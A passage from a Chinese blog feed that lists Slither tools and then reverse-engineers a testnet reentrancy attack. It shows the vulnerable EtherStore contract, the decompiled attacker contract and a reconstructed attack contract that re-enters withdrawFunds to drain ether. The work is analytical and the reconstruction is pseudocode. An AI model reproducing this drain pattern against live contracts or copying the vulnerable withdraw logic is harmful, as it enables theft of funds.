(github.com)</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li><code>slither-check-upgradeability</code>：<a href="https://github.com/crytic/slither/wiki/Upgradeability-Checks" target="_blank" rel="noopener">查看基于<code>委托调用</code>的可升级性</a></li><li><code>slither-prop</code>：<a href="https://github.com/crytic/slither/wiki/Property-generation" target="_blank" rel="noopener">自动单元测试和属性生成</a></li><li><code>slither-flat</code>：<a href="https://github.com/crytic/slither/wiki/Contract-Flattening" target="_blank" rel="noopener">平展代码库</a></li><li><code>slither-check-erc</code>：<a href="https://github.com/crytic/slither/wiki/ERC-Conformance" target="_blank" rel="noopener">检查 ERC 的一致性</a></li><li><code>slither-format</code>：<a href="https://github.com/crytic/slither/wiki/Slither-format" target="_blank" rel="noopener">自动生成补丁</a></li><li><code>slither-read-storage</code>：<a href="https://github.com/crytic/slither/blob/master/slither/tools/read_storage/README.md" target="_blank" rel="noopener">从合约中读取存储值</a></li></ul><p>有关其他工具，请参阅<a href="https://github.com/crytic/slither/wiki/Tool-Documentation" target="_blank" rel="noopener">工具文档</a>。</p>]]></content>
      
      
      <categories>
          
          <category> static-analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static-analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向分析初探</title>
      <link href="/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/"/>
      <url>/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>区块链上所有的数据都是公开透明的，所以合约的代码也都是公开的。但是其实它公开的都是经过编译的OPCODE，真正的源代码公开与否就得看发布合约的人了。</p><p>如果要真正的掌握一个合约会干什么，就得从OPCODE逆向成solidity代码。</p><p>工欲善其事，必先利其器solidity智能合约逆向工具推荐：<a href="https://link.zhihu.com/?target=https%3A//ethervm.io/decompile">https://ethervm.io/decompile</a></p><p><a href="https://link.zhihu.com/?target=https%3A//contract-library.com/">https://contract-library.com/</a></p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/crytic/ida-evm">https://github.com/crytic/ida-evm</a></p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/comaeio/porosity">https://github.com/comaeio/porosity</a></p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/meyer9/ethdasm">https://github.com/meyer9/ethdasm</a></p><p>这里我选择工具 <a href="https://link.zhihu.com/?target=https%3A//ethervm.io/decompile">https://ethervm.io/decompile</a></p><p>尽量选择把合约部署到链上后使用地址的方式去逆向，否则可能只会得到合约的<code>Disassembly</code>结果。</p><h2 id="重入事件逆向分析"><a href="#重入事件逆向分析" class="headerlink" title="重入事件逆向分析"></a>重入事件逆向分析</h2><p>本文选择测试网络进行一次重入漏洞攻击复现的逆向分析。</p><p>漏洞合约地址：<a href="https://ropsten.etherscan.io/address/0x8872be6d31f2ec0169e5e3e69e5cae8823d358af" target="_blank" rel="noopener">Contract Address 0x8872be6d31f2ec0169e5e3e69e5cae8823d358af | Etherscan</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.17</span>;</span><br><span class="line">contract EtherStore&#123;</span><br><span class="line">    uint256 public withdrawaLimit = <span class="number">1</span> ether;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">depositFunds</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdrawFunds</span> (<span class="params">uint256 _weiToWithdraw</span>) <span class="title">public</span> </span>&#123;<span class="comment">// 该函数存在重入漏洞，具体原因是使用call函数转账，且call函数转账发生在合约状态更新之前</span></span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        <span class="built_in">require</span>(_weiToWithdraw &lt;= withdrawaLimit);</span><br><span class="line">        <span class="built_in">require</span>(now &gt;= lastWithdrawTime[msg.sender] + <span class="number">1</span> weeks);</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.call.value(_weiToWithdraw)());</span><br><span class="line">        balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查询合约内部交易可以发现</p><p>可疑地址 <code>0x2409fE8CCabe32F7AEbA8b34DA111A990b5A3E40</code></p><p>交易哈希 <code>0x80270b685344fc5005f4969ef6bd545a614cd6e2fc92b9508cfed5266368062f</code></p><p><img src="retrencytx.png" alt=""></p><p>通过分析imput Data可以发现攻击者应该是调用<code>0x6289d385</code>这个函数进行攻击的。</p><p><img src="retrencydata.png" alt=""></p><p>接下来对攻击合约OPOCDE进行逆向分析</p><h3 id="逆向结果："><a href="#逆向结果：" class="headerlink" title="逆向结果："></a>逆向结果：</h3><p>得到的伪代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        memory[<span class="number">0x40</span>:<span class="number">0x60</span>] = <span class="number">0x80</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (msg.data.length &lt; <span class="number">0x04</span>) &#123;</span><br><span class="line">        label_0057:</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (address(storage[<span class="number">0x00</span>] &amp; </span><br><span class="line"><span class="number">0xffffffffffffffffffffffffffffffffffffffff</span>).balance &lt;= </span><br><span class="line"><span class="number">0x0de0b6b3a7640000</span>) &#123; stop(); &#125;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">var</span> var0 = storage[<span class="number">0x00</span>] &amp; <span class="number">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class="line">            <span class="keyword">var</span> var1 = <span class="number">0x155dd5ee</span>;</span><br><span class="line">            <span class="keyword">var</span> temp0 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            memory[temp0:temp0 + <span class="number">0x20</span>] = (var1 &amp; <span class="number">0xffffffff</span>) * <span class="number">0x0100000000000000000000000000000000000000000000000000000000</span>;</span><br><span class="line">            <span class="keyword">var</span> temp1 = temp0 + <span class="number">0x04</span>;</span><br><span class="line">            memory[temp1:temp1 + <span class="number">0x20</span>] = <span class="number">0x0de0b6b3a7640000</span>;</span><br><span class="line">            <span class="keyword">var</span> var2 = temp1 + <span class="number">0x20</span>;</span><br><span class="line">            <span class="keyword">var</span> var3 = <span class="number">0x00</span>;</span><br><span class="line">            <span class="keyword">var</span> var4 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            <span class="keyword">var</span> var5 = var2 - var4;</span><br><span class="line">            <span class="keyword">var</span> var6 = var4;</span><br><span class="line">            <span class="keyword">var</span> var7 = <span class="number">0x00</span>;</span><br><span class="line">            <span class="keyword">var</span> var8 = var0;</span><br><span class="line">            <span class="keyword">var</span> var9 = !address(var8).code.length;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (var9) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">var</span> temp2;</span><br><span class="line">            temp2, memory[var4:var4 + var3] = address(var8).call.gas(msg.gas).value(var7)(memory[var6:var6 + var5]);</span><br><span class="line">            var3 = !temp2;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (!var3) &#123; stop(); &#125;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">var</span> temp3 = returndata.length;</span><br><span class="line">            memory[<span class="number">0x00</span>:<span class="number">0x00</span> + temp3] = returndata[<span class="number">0x00</span>:<span class="number">0x00</span> + temp3];</span><br><span class="line">            revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span> + returndata.length]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var0 = msg.data[<span class="number">0x00</span>:<span class="number">0x20</span>] / <span class="number">0x0100000000000000000000000000000000000000000000000000000000</span> &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (var0 == <span class="number">0x6289d385</span>) &#123;</span><br><span class="line">                <span class="comment">// Dispatch table entry for 0x6289d385 (unknown)</span></span><br><span class="line">                var1 = <span class="number">0x015a</span>;</span><br><span class="line">                func_01CA();</span><br><span class="line">                stop();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == <span class="number">0xacd2e6e5</span>) &#123;</span><br><span class="line">                <span class="comment">// Dispatch table entry for 0xacd2e6e5 (unknown)</span></span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> (var1) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = <span class="number">0x0171</span>;</span><br><span class="line">                var2 = func_0339();</span><br><span class="line">                <span class="keyword">var</span> temp4 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">                memory[temp4:temp4 + <span class="number">0x20</span>] = var2 &amp; <span class="number">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class="line">                <span class="keyword">var</span> temp5 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">                <span class="keyword">return</span> memory[temp5:temp5 + (temp4 + <span class="number">0x20</span>) - temp5];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == <span class="number">0xff11e1db</span>) &#123;</span><br><span class="line">                <span class="comment">// Dispatch table entry for collectEther()</span></span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> (var1) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = <span class="number">0x01c8</span>;</span><br><span class="line">                collectEther();</span><br><span class="line">                stop();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; goto label_0057; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func_01CA</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.value &lt; <span class="number">0x0de0b6b3a7640000</span>) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> var0 = storage[<span class="number">0x00</span>] &amp; <span class="number">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class="line">        <span class="keyword">var</span> var1 = <span class="number">0xe2c41dbc</span>;</span><br><span class="line">        <span class="keyword">var</span> var2 = <span class="number">0x0de0b6b3a7640000</span>;</span><br><span class="line">        <span class="keyword">var</span> temp0 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">        memory[temp0:temp0 + <span class="number">0x20</span>] = (var1 &amp; <span class="number">0xffffffff</span>) * <span class="number">0x0100000000000000000000000000000000000000000000000000000000</span>;</span><br><span class="line">        <span class="keyword">var</span> var3 = temp0 + <span class="number">0x04</span>;</span><br><span class="line">        <span class="keyword">var</span> var4 = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">var</span> var5 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">        <span class="keyword">var</span> var6 = var3 - var5;</span><br><span class="line">        <span class="keyword">var</span> var7 = var5;</span><br><span class="line">        <span class="keyword">var</span> var8 = var2;</span><br><span class="line">        <span class="keyword">var</span> var9 = var0;</span><br><span class="line">        <span class="keyword">var</span> var10 = !address(var9).code.length;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (var10) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> temp1;</span><br><span class="line">        temp1, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]);</span><br><span class="line">        var4 = !temp1;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!var4) &#123;</span><br><span class="line">            var0 = storage[<span class="number">0x00</span>] &amp; <span class="number">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class="line">            var1 = <span class="number">0x155dd5ee</span>;</span><br><span class="line">            <span class="keyword">var</span> temp2 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            memory[temp2:temp2 + <span class="number">0x20</span>] = (var1 &amp; <span class="number">0xffffffff</span>) * <span class="number">0x0100000000000000000000000000000000000000000000000000000000</span>;</span><br><span class="line">            <span class="keyword">var</span> temp3 = temp2 + <span class="number">0x04</span>;</span><br><span class="line">            memory[temp3:temp3 + <span class="number">0x20</span>] = <span class="number">0x0de0b6b3a7640000</span>;</span><br><span class="line">            var2 = temp3 + <span class="number">0x20</span>;</span><br><span class="line">            var3 = <span class="number">0x00</span>;</span><br><span class="line">            var4 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            var5 = var2 - var4;</span><br><span class="line">            var6 = var4;</span><br><span class="line">            var7 = <span class="number">0x00</span>;</span><br><span class="line">            var8 = var0;</span><br><span class="line">            var9 = !address(var8).code.length;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (var9) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">var</span> temp4;</span><br><span class="line">            temp4, memory[var4:var4 + var3] = address(var8).call.gas(msg.gas).value(var7)(memory[var6:var6 + var5]);</span><br><span class="line">            var3 = !temp4;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (!var3) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">var</span> temp5 = returndata.length;</span><br><span class="line">            memory[<span class="number">0x00</span>:<span class="number">0x00</span> + temp5] = returndata[<span class="number">0x00</span>:<span class="number">0x00</span> + temp5];</span><br><span class="line">            revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span> + returndata.length]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> temp6 = returndata.length;</span><br><span class="line">            memory[<span class="number">0x00</span>:<span class="number">0x00</span> + temp6] = returndata[<span class="number">0x00</span>:<span class="number">0x00</span> + temp6];</span><br><span class="line">            revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span> + returndata.length]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func_0339</span>(<span class="params"></span>) <span class="title">returns</span> (<span class="params">var r0</span>) </span>&#123; <span class="keyword">return</span> storage[<span class="number">0x00</span>] &amp; <span class="number">0xffffffffffffffffffffffffffffffffffffffff</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">collectEther</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> temp0 = address(address(<span class="keyword">this</span>)).balance;</span><br><span class="line">        <span class="keyword">var</span> temp1 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">        <span class="keyword">var</span> temp2;</span><br><span class="line"></span><br><span class="line">        temp2, memory[temp1:temp1 + <span class="number">0x00</span>] = </span><br><span class="line">address(msg.sender).call.gas(!temp0 * </span><br><span class="line"><span class="number">0x08fc</span>).value(temp0)(memory[temp1:temp1 + memory[<span class="number">0x40</span>:<span class="number">0x60</span>] - temp1]);</span><br><span class="line">        <span class="keyword">var</span> var0 = !temp2;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!var0) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> temp3 = returndata.length;</span><br><span class="line">        memory[<span class="number">0x00</span>:<span class="number">0x00</span> + temp3] = returndata[<span class="number">0x00</span>:<span class="number">0x00</span> + temp3];</span><br><span class="line">        revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span> + returndata.length]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h5><p>接下来，先从主函数开始分析：</p><p>主函数是合约在每次被调用时都会被执行的函数，此函数只存在于底层逻辑中，是函数调用的关键，可以理解为“转接电话”的功能。</p><p>开辟空间:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory[0x40:0x60] &#x3D; 0x80;</span><br></pre></td></tr></table></figure><p>如果消息发送者携带消息长度小于0x04执行后面的内容，一般是回退函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (msg.data.length &lt; 0x04)&#123;</span><br></pre></td></tr></table></figure><p>地址余额小于等于 1eth 停止执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (address(storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff).balance &lt;&#x3D; 0x0de0b6b3a7640000) &#123; stop(); &#125;</span><br></pre></td></tr></table></figure><p>接下来一段主要设置后续操作需要的信息，主要内容有 地址、需要调用的函数签名、1eth值、地址空代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var var0 &#x3D; storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff;&#x2F;&#x2F;地址</span><br><span class="line">var var1 &#x3D; 0x155dd5ee;&#x2F;&#x2F;需要调用的函数签名</span><br><span class="line">var temp0 &#x3D; memory[0x40:0x60];</span><br><span class="line">memory[temp0:temp0 + 0x20] &#x3D; (var1 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000;</span><br><span class="line">var temp1 &#x3D; temp0 + 0x04;</span><br><span class="line">memory[temp1:temp1 + 0x20] &#x3D; 0x0de0b6b3a7640000;&#x2F;&#x2F;1eth值</span><br><span class="line">var var2 &#x3D; temp1 + 0x20;</span><br><span class="line">var var3 &#x3D; 0x00;</span><br><span class="line">var var4 &#x3D; memory[0x40:0x60];</span><br><span class="line">var var5 &#x3D; var2 - var4;</span><br><span class="line">var var6 &#x3D; var4;</span><br><span class="line">var var7 &#x3D; 0x00;</span><br><span class="line">var var8 &#x3D; var0;</span><br><span class="line">var var9 &#x3D; !address(var8).code.length;&#x2F;&#x2F;地址空代码</span><br></pre></td></tr></table></figure><p>对地址是否为空代码的判断，如果是回滚初始状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (var9) &#123; revert(memory[0x00:0x00]); &#125;</span><br></pre></td></tr></table></figure><p>向地址发送值为1eth的 <code>0x155dd5ee</code> 函数调用信息，并返回信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var temp2;</span><br><span class="line">temp2, memory[var4:var4 + var3] &#x3D; address(var8).call.gas(msg.gas).value(var7)(memory[var6:var6 + var5]);</span><br><span class="line">var3 &#x3D; !temp2;</span><br><span class="line">        </span><br><span class="line">if (!var3) &#123; stop(); &#125;</span><br><span class="line">        </span><br><span class="line">var temp3 &#x3D; returndata.length;</span><br><span class="line">memory[0x00:0x00 + temp3] &#x3D; returndata[0x00:0x00 + temp3];</span><br><span class="line">revert(memory[0x00:0x00 + returndata.length]);</span><br></pre></td></tr></table></figure><p>接收消息调用者携带的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">            var0 &#x3D; msg.data[0x00:0x20] &#x2F; 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;</span><br></pre></td></tr></table></figure><p>后面的代码内容基本就是通过消息调用者携带的信息判断调用的函数，其中没有<code>if (var1) { revert(memory[0x00:0x00]); }</code> 的函数能接收以太币。</p><h5 id="函数func-01CA"><a href="#函数func-01CA" class="headerlink" title="函数func_01CA()"></a><strong>函数func_01CA()</strong></h5><p>消息调用者携带的金额价值小于 1eth 回滚初始状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (msg.value &lt; 0x0de0b6b3a7640000) &#123; revert(memory[0x00:0x00]); &#125;</span><br></pre></td></tr></table></figure><p>接下来的代码与回退函数内容极其相似就是调用函数，从内容上看这次它调用了两个函数分别是<code>0xe2c41dbc</code> ， <code>0x155dd5ee</code></p><p>在调用 <code>0xe2c41dbc</code> 函数的时候信息 value 1eth data 0</p><p>在调用 <code>0x155dd5ee</code> 函数的时候信息 value 0 data 1eth</p><p>最后返回调用信息。</p><h5 id="函数func-0339"><a href="#函数func-0339" class="headerlink" title="函数func_0339()"></a><strong>函数func_0339()</strong></h5><p>返回地址信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br></pre></td></tr></table></figure><h5 id="函数collectEther"><a href="#函数collectEther" class="headerlink" title="函数collectEther()"></a><strong>函数collectEther()</strong></h5><p>设置信息，该合约余额 、新空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var temp0 &#x3D; address(address(this)).balance;</span><br><span class="line">var temp1 &#x3D; memory[0x40:0x60];</span><br></pre></td></tr></table></figure><p>向消息调用者发送该合约余额，注意这里对gas做了限制 <code>(!temp0 * 0x08fc)</code> 其实这里包括后面的代码就是transfer()的功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  temp2, memory[temp1:temp1 + 0x00] &#x3D; </span><br><span class="line">address(msg.sender).call.gas(!temp0 * </span><br><span class="line">0x08fc).value(temp0)(memory[temp1:temp1 + memory[0x40:0x60] - temp1]);</span><br><span class="line">        var var0 &#x3D; !temp2;</span><br><span class="line">    </span><br><span class="line">        if (!var0) &#123; return; &#125;</span><br></pre></td></tr></table></figure><p>最后返回调用信息。</p><p><strong>还原代码</strong></p><p>我们可以通过 <a href="https://link.zhihu.com/?target=https%3A//www.4byte.directory/">https://www.4byte.directory/</a> 在线查询 函数签名对应的函数名称，有助于我们理解函数</p><p><img src="functionname1.png" alt=""></p><p><img src="functionname2.png" alt=""></p><p>还原后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract At&#123;</span><br><span class="line">    </span><br><span class="line">    function func_0339() public returns (var r0) &#123; return storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff; &#125;</span><br><span class="line">    </span><br><span class="line">    function func_01CA() public payable&#123;</span><br><span class="line">        require(msg.value &gt;&#x3D; 1 ether);</span><br><span class="line">        storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff.depositFunds.value(1 ether)();</span><br><span class="line">        storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff.withdrawFunds(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function collectEther() public &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function () payable &#123;</span><br><span class="line">        if (storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff.balance &gt; 1 ether) &#123;</span><br><span class="line">            storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff.withdrawFunds(1 eth);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff</code> 其实等价于漏洞合约地址<code>0x8872bE6d31F2Ec0169e5E3E69e5CAe8823d358aF</code></p><h4 id="0x03-综合分析"><a href="#0x03-综合分析" class="headerlink" title="0x03 综合分析"></a>0x03 